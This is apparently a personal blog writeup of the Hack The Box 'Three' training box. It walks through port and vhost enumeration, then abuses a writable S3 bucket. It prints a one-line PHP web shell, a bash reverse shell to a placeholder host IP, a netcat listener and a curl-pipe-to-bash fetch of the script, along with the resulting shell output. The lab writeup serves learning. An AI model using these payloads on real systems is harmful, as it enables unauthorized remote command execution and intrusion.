---
title: 'Three - HTB Starting Point Tier 1'
description: 'Writeup for Three box'
pubDate: 'Dec 3 2024'
heroImage: 'blog-placeholder-2.jpg'
---

## Three
*Subdomain enumeration, S3 traversal, PHP, Bash, reverse shell*

**Task 1**  
How many TCP ports are open?  
2

```bash
$ nmap -sV $TARGET -p1-10000 --min-rate=5000

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
```

**Task 2**  
What is the domain of the email address provided in the "Contact" section of the website?  
`thetoppers.htb`


**Task 3**  
In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?  
`/etc/hosts`


**Task 4**  
Which sub-domain is discovered during further enumeration?  

Website enumeration can be done using gobuster. Will try its DNS enumeration mode (after adding `thetoppers.htb` to my `/etc/hosts` file):  
```bash
$ gobuster dns -d thetoppers.htb -w ~/Documents/git/SecLists/Discovery/DNS/shubs-subdomains.txt
```

The above didn't return any results. Returning to a concept explained in an earlier Starting Point box (and referring to the writeup), it is possible that this site is using name-based virtual hosting. In that case, we can use `gobuster vhost`

```bash
$ gobuster vhost --apend-domain -u thetoppers.htb -w ~/Documents/git/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

Found: s3.thetoppers.htb Status: 404 [Size: 21]
```

N.b. My internet dies very quickly when using gobuster, and I lose connectivity. 


**Task 5**  
Which service is running on the discovered sub-domain?  
Amazon S3


**Task 6**  
Which command line utility can be used to interact with the service running on the discovered sub-domain?  
`awscli`


**Task 7**  
Which command is used to set up the AWS CLI installation?  
`aws configure`


**Task 8**  
What is the command used by the above utility to list all of the S3 buckets?  
`aws s3 ls`


**Task 9**  
This server is configured to run files written in what web scripting language?    
`php`

> **Learning opportunity**
>
> There is a browser extension called Wappalyzer. It can be used to identify all the different components that a website is using, such as programming language(s), web servers, cdns, operating systems, etc.


**Task 10**  
Submit root flag  

Using the AWS CLI, we can explore the S3 buckets hosted here
```bash
$ aws --endpoint=http://s3.thetoppers.htb s3 ls
2024-12-02 17:40:24 thetoppers.htb


$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2024-12-02 17:40:24          0 .htaccess
2024-12-02 17:40:24      11952 index.php

$ aws --endpoint=http://s3.thetoppers.htb s3 cp s3://thetoppers.htb/index.php ./index.php
download: s3://thetoppers.htb/index.php to ./index.php
```

Based on the above, it seems that `thetoppers.htb` is using the files in this S3 bucket for the site. If so, we might be able to upload a php shell to the bucket and have it execute on the server.

```bash
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
$ curl http://thetoppers.htb/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Success! Next, let's try to obtain a reverse shell. First, we'll write up a simple reverse shell bash script:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<HOST_IP>/1337 0>&1
```

Some notes:
* `-i` makes bash interactive
* `>&` redirects stdout and stderr to the proceeding location
* `/dev/tcp/<ip>/<port>` is a special file to allow raw TCP connections
* `0>&1` redirects stdin to come from same location as stdout

The goal is for the target machine to execute this script. There are 2 more items required to perform the exploit: (1) set up a listener on our device, and (2) execute the script on the target. Regarding the first item, to receive the connection we must set up a listener on our device to receive the connection:

```bash
$ nc -nvlp 1337
```

Options:
* `-n` - Numeric only IP addresses, no DNS
* `-v` - Verbose
* `-l` - Listen for inbound connections
* `-p` - Specify the port

Now to execute the reverse shell script on the client, one way it can be done is to set up a local http server to serve the script. From the target, we can curl the file and pipe it into bash:

```bash
$ cd path/to/reverse/shell.sh
$ python3 -m http.server 8000 &
$ curl "http://thetoppers.htb/shell.php?cmd=curl <ip>:8000/shell.sh|bash
```

The request may hang, but you should see a connection made in netcat

```bash
$ nc -nvlp 1337
listening on [any] 1337 ...
$TARGET_IP - - [02/Dec/2024 19:28:15] "GET /shell.sh HTTP/1.1" 200 -
connect to [$HOST_IP] from (UNKNOWN) [$TARGET_IP] 36496
bash: cannot set terminal process group (1492): Inappropriate ioctl for device
bash: no job control in this shell
www-data@three:/var/www/html$ whoami
whoami
www-data
www-data@three:/var/www/html$ ls
ls
images
index.php
shell.php
www-data@three:/var/www/html$ cd ..
cd ..
www-data@three:/var/www$ ls
ls
flag.txt
html
www-data@three:/var/www$ cat flag.txt
cat flag.txt
<FLAG>
```

Read a high level summary of this challenge [here](blog/htb-starting-point/reverse-shell-php-and-bash/).